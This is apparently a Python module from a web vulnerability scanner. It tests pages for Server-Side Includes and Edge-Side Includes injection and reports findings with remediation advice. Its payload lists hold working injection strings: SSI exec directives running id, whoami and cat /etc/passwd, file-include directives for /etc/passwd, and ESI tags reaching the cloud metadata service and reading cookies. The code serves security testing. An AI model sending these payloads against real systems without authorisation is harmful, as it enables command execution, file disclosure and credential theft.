"""
SSITester — Server-Side Includes and Edge-Side Includes injection detection.
CWE-96 — Improper Neutralization of Directives in Statically Saved Code.

Tests for: Apache SSI directives (echo, exec, include, printenv),
ESI injection (Varnish, Squid, CDNs), and detection via response analysis.
"""
import re
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .base_tester import BaseTester

logger = logging.getLogger(__name__)

# SSI payloads (Apache, nginx SSI module)
_SSI_PAYLOADS = [
    # Information disclosure
    ('<!--#echo var="DATE_LOCAL" -->', 'SSI echo DATE_LOCAL',
     r'\d{4}[-/]\d{2}[-/]\d{2}|\w{3},\s+\d{2}\s+\w{3}\s+\d{4}'),
    ('<!--#echo var="SERVER_SOFTWARE" -->', 'SSI echo SERVER_SOFTWARE',
     r'Apache|nginx|IIS|LiteSpeed'),
    ('<!--#echo var="DOCUMENT_ROOT" -->', 'SSI echo DOCUMENT_ROOT',
     r'/var/www|/srv|/home|C:\\'),
    ('<!--#echo var="REMOTE_ADDR" -->', 'SSI echo REMOTE_ADDR',
     r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'),
    ('<!--#printenv -->', 'SSI printenv',
     r'SERVER_NAME=|DOCUMENT_ROOT=|HTTP_HOST='),
    # File inclusion
    ('<!--#include virtual="/etc/passwd" -->', 'SSI include /etc/passwd',
     r'root:x:0:0'),
    ('<!--#include virtual="/etc/hosts" -->', 'SSI include /etc/hosts',
     r'localhost|127\.0\.0\.1'),
    # Command execution (critical)
    ('<!--#exec cmd="id" -->', 'SSI exec id',
     r'uid=\d+'),
    ('<!--#exec cmd="whoami" -->', 'SSI exec whoami',
     r'www-data|apache|nginx|root|nobody'),
    ('<!--#exec cmd="cat /etc/passwd" -->', 'SSI exec cat passwd',
     r'root:x:0:0'),
]

# ESI payloads (Varnish, Squid, CDNs)
_ESI_PAYLOADS = [
    ('<esi:include src="http://localhost/" />', 'ESI include localhost',
     r'<!DOCTYPE|<html|<body|Welcome'),
    ('<esi:include src="http://169.254.169.254/latest/meta-data/" />', 'ESI SSRF metadata',
     r'ami-id|instance-id|security-credentials'),
    ('<esi:include src="/etc/passwd" onerror="continue" />', 'ESI include passwd',
     r'root:x:0:0'),
    ('<esi:comment text="test"/>', 'ESI comment probe',
     None),  # If stripped from output, ESI is being processed
    ('<esi:vars>$(HTTP_COOKIE)</esi:vars>', 'ESI vars cookie',
     r'session|token|csrf'),
    ('<esi:assign name="test" value="ESI_ACTIVE"/><esi:vars>$(test)</esi:vars>',
     'ESI assign/vars', 'ESI_ACTIVE'),
]

# Headers that may trigger SSI/ESI processing
_SSI_INJECTABLE_HEADERS = ['Referer', 'User-Agent', 'X-Forwarded-For']


class SSITester(BaseTester):
    """Test for Server-Side Includes and Edge-Side Includes injection."""

    TESTER_NAME = 'SSI'

    def test(self, page, depth: str = 'medium', recon_data: dict = None) -> list:
        vulnerabilities = []

        # Check if page extension suggests SSI support
        ssi_extensions = ('.shtml', '.stm', '.shtm', '.ssi')
        parsed_url = urlparse(page.url)
        is_ssi_page = any(parsed_url.path.lower().endswith(ext) for ext in ssi_extensions)

        # Test URL parameters
        for param_name in page.parameters:
            vuln = self._test_ssi_param(page.url, param_name)
            if vuln:
                vulnerabilities.append(vuln)
                break

        # Test form inputs
        for form in page.forms:
            for inp in form.inputs:
                if inp.input_type in ('hidden', 'submit', 'button', 'file', 'image'):
                    continue
                vuln = self._test_ssi_form(form, inp, page.url)
                if vuln:
                    vulnerabilities.append(vuln)
                    break
            if vulnerabilities:
                break

        # ESI injection testing (medium+)
        if depth in ('medium', 'deep'):
            for param_name in page.parameters:
                vuln = self._test_esi_param(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)
                    break

            # ESI detection via headers
            vuln = self._detect_esi_support(page)
            if vuln:
                vulnerabilities.append(vuln)

        # Deep: header-based SSI injection
        if depth == 'deep':
            header_vulns = self._test_ssi_via_headers(page)
            vulnerabilities.extend(header_vulns)

            # SSI detection on .shtml pages
            if is_ssi_page:
                vuln = self._check_ssi_page(page)
                if vuln:
                    vulnerabilities.append(vuln)

        return vulnerabilities

    def _test_ssi_param(self, url, param_name):
        """Test URL parameter for SSI injection."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for payload, desc, pattern in _SSI_PAYLOADS:
            params[param_name] = payload
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))
            resp = self._make_request('GET', test_url)
            if not resp or not resp.text:
                continue

            body = resp.text
            # Check if payload was NOT echoed back (SSI processed it)
            if payload in body:
                continue

            if pattern and re.search(pattern, body):
                severity = 'critical' if 'exec' in payload else 'high'
                cvss = 9.8 if 'exec' in payload else 7.5
                return self._build_vuln(
                    name=f'SSI Injection in Parameter: {param_name}',
                    severity=severity,
                    category='Server-Side Includes Injection',
                    description=f'The parameter "{param_name}" is vulnerable to SSI injection. '
                               f'The directive "{desc}" was processed by the server and returned '
                               f'sensitive information or executed a command.',
                    impact=self._get_ssi_impact(payload),
                    remediation='Disable SSI processing on the web server. If SSI is required, '
                               'sanitize user input by encoding HTML comment characters. '
                               'Never allow user input in SSI-processed pages.',
                    cwe='CWE-96' if 'exec' not in payload else 'CWE-78',
                    cvss=cvss,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\nPayload: {payload}\n'
                            f'Directive: {desc}\nSSI output detected in response.',
                )
        return None

    def _test_ssi_form(self, form, inp, page_url):
        """Test form input for SSI injection."""
        for payload, desc, pattern in _SSI_PAYLOADS[:5]:  # Limited set for forms
            data = {}
            for form_inp in form.inputs:
                if form_inp.name == inp.name:
                    data[form_inp.name] = payload
                else:
                    data[form_inp.name] = form_inp.value or 'test'

            target_url = form.action or page_url
            method = form.method.upper()
            if method == 'POST':
                resp = self._make_request('POST', target_url, data=data)
            else:
                resp = self._make_request('GET', target_url, params=data)

            if not resp or not resp.text:
                continue

            body = resp.text
            if payload in body:
                continue

            if pattern and re.search(pattern, body):
                severity = 'critical' if 'exec' in payload else 'high'
                return self._build_vuln(
                    name=f'SSI Injection in Form Field: {inp.name}',
                    severity=severity,
                    category='Server-Side Includes Injection',
                    description=f'The form field "{inp.name}" is vulnerable to SSI injection.',
                    impact=self._get_ssi_impact(payload),
                    remediation='Disable SSI or sanitize user input. Encode <!-- sequences.',
                    cwe='CWE-96',
                    cvss=9.8 if 'exec' in payload else 7.5,
                    affected_url=target_url,
                    evidence=f'Form: {method} {target_url}\nField: {inp.name}\n'
                            f'Payload: {payload}\nDirective: {desc}',
                )
        return None

    def _test_esi_param(self, url, param_name):
        """Test URL parameter for ESI injection."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for payload, desc, pattern in _ESI_PAYLOADS:
            params[param_name] = payload
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))
            resp = self._make_request('GET', test_url)
            if not resp or not resp.text:
                continue

            body = resp.text

            # For comment probe: check if the tag was REMOVED (processed)
            if 'esi:comment' in payload:
                if 'esi:comment' not in body and resp.status_code == 200:
                    return self._build_vuln(
                        name=f'ESI Processing Detected: {param_name}',
                        severity='medium',
                        category='Edge-Side Includes Injection',
                        description=f'ESI tags injected via "{param_name}" are being processed '
                                   f'by an edge/proxy server. The ESI comment tag was stripped '
                                   f'from the response, confirming ESI support.',
                        impact='ESI injection can be used for SSRF (accessing internal services), '
                              'XSS (injecting content from external sources), and information '
                              'disclosure (reading cookies, headers).',
                        remediation='Disable ESI processing for user-controlled content. '
                                   'Sanitize user input by encoding ESI tags. '
                                   'Configure the edge server to disable ESI on dynamic pages.',
                        cwe='CWE-96',
                        cvss=6.5,
                        affected_url=url,
                        evidence=f'Parameter: {param_name}\nPayload: {payload}\n'
                                f'ESI comment tag was processed and removed.',
                    )
                continue

            # Check for ESI output
            if payload in body:
                continue

            if pattern:
                if isinstance(pattern, str) and pattern in body:
                    return self._build_esi_vuln(url, param_name, payload, desc)
                elif isinstance(pattern, str) and re.search(pattern, body):
                    return self._build_esi_vuln(url, param_name, payload, desc)
        return None

    def _build_esi_vuln(self, url, param_name, payload, desc):
        """Build ESI injection vulnerability finding."""
        return self._build_vuln(
            name=f'ESI Injection: {desc}',
            severity='high',
            category='Edge-Side Includes Injection',
            description=f'The parameter "{param_name}" is vulnerable to ESI injection. '
                       f'The directive "{desc}" was processed by the edge/proxy server.',
            impact='ESI injection enables SSRF to internal services, XSS via included '
                  'content, and information disclosure (cookies, session tokens). '
                  'If combined with SSRF, cloud metadata theft is possible.',
            remediation='Disable ESI processing for user-controlled content. '
                       'Configure edge servers to not process ESI in user input. '
                       'Use Content-Security-Policy to limit included sources.',
            cwe='CWE-96',
            cvss=7.5,
            affected_url=url,
            evidence=f'Parameter: {param_name}\nPayload: {payload}\nDirective: {desc}',
        )

    def _detect_esi_support(self, page):
        """Detect ESI support from response headers."""
        headers = page.headers if hasattr(page, 'headers') else {}
        if isinstance(headers, dict):
            header_str = str(headers).lower()
        else:
            header_str = ''

        esi_indicators = [
            ('surrogate-control', 'Surrogate-Control header'),
            ('x-esi', 'X-ESI header'),
            ('x-varnish', 'Varnish proxy (potential ESI)'),
            ('x-cache', 'Cache proxy detected'),
        ]

        for indicator, desc in esi_indicators:
            if indicator in header_str:
                if 'esi' in header_str or 'surrogate' in header_str:
                    return self._build_vuln(
                        name=f'ESI Support Detected: {desc}',
                        severity='info',
                        category='Edge-Side Includes Injection',
                        description=f'The response headers indicate ESI support ({desc}). '
                                   f'If user input reaches ESI-processed templates, injection '
                                   f'may be possible.',
                        impact='ESI-enabled servers may process injected ESI tags.',
                        remediation='Review ESI configuration. Ensure user input is not '
                                   'rendered in ESI-processed templates.',
                        cwe='CWE-96',
                        cvss=0,
                        affected_url=page.url,
                        evidence=f'Header indicator: {desc}\n'
                                f'Response headers suggest ESI processing capability.',
                    )
        return None

    def _test_ssi_via_headers(self, page):
        """Test SSI injection via HTTP headers that may be logged/reflected."""
        vulns = []
        for header_name in _SSI_INJECTABLE_HEADERS:
            for payload, desc, pattern in _SSI_PAYLOADS[:3]:
                resp = self._make_request('GET', page.url,
                                         headers={header_name: payload})
                if not resp or not resp.text:
                    continue
                if payload in resp.text:
                    continue
                if pattern and re.search(pattern, resp.text):
                    vulns.append(self._build_vuln(
                        name=f'SSI Injection via Header: {header_name}',
                        severity='high',
                        category='Server-Side Includes Injection',
                        description=f'SSI directive injected via "{header_name}" header was '
                                   f'processed, returning sensitive information.',
                        impact=self._get_ssi_impact(payload),
                        remediation='Sanitize all HTTP header values before SSI processing.',
                        cwe='CWE-96',
                        cvss=7.5,
                        affected_url=page.url,
                        evidence=f'Header: {header_name}\nPayload: {payload}\n'
                                f'SSI output in response.',
                    ))
                    break
        return vulns

    def _check_ssi_page(self, page):
        """Check .shtml pages for active SSI processing."""
        body = page.body or ''
        # If the page shows SSI output (like dates, server info), SSI is active
        ssi_active_patterns = [
            r'Last modified:\s*\w+',
            r'Server:\s*(Apache|nginx)',
        ]
        for pattern in ssi_active_patterns:
            if re.search(pattern, body):
                return self._build_vuln(
                    name='Active SSI Processing Detected',
                    severity='info',
                    category='Server-Side Includes Injection',
                    description='This .shtml page shows evidence of active SSI processing. '
                               'If user input reaches this page, SSI injection may be possible.',
                    impact='SSI-processed pages that accept user input are vulnerable to '
                          'information disclosure and potentially RCE via <!--#exec-->.',
                    remediation='Review whether user input can reach SSI-processed pages. '
                               'Disable <!--#exec--> directive in SSI configuration.',
                    cwe='CWE-96',
                    cvss=0,
                    affected_url=page.url,
                    evidence='SSI processing indicators found in .shtml page.',
                )
        return None

    @staticmethod
    def _get_ssi_impact(payload):
        """Get impact description based on SSI payload type."""
        if 'exec' in payload:
            return ('Remote Code Execution via SSI <!--#exec-->. An attacker can execute '
                    'arbitrary OS commands on the server, leading to full system compromise.')
        elif 'include' in payload:
            return ('Arbitrary file inclusion via SSI <!--#include-->. An attacker can read '
                    'sensitive files including /etc/passwd, configuration files, and source code.')
        else:
            return ('Information disclosure via SSI directives. Server environment variables, '
                    'file paths, and configuration details are exposed.')
